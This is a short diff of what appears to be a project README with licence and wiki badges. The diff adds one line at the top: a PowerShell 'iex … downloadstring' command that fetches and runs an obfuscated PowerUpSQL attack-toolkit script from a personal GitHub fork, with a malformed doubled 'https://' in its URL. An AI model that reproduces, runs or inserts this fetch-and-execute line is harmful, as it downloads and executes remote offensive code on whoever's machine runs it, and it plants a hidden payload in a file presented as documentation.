@@ -1,4 +1,4 @@
-
+iex(new-object net.webclient).downloadstring('https://https://raw.githubusercontent.com/R0ckNRolla/PowerUpSQL/master/Obfus_SecurePS_PowerUpSQL.ps1')
  &nbsp;
 [![licence badge]][licence] 
 [![wiki Badge]][wiki] 
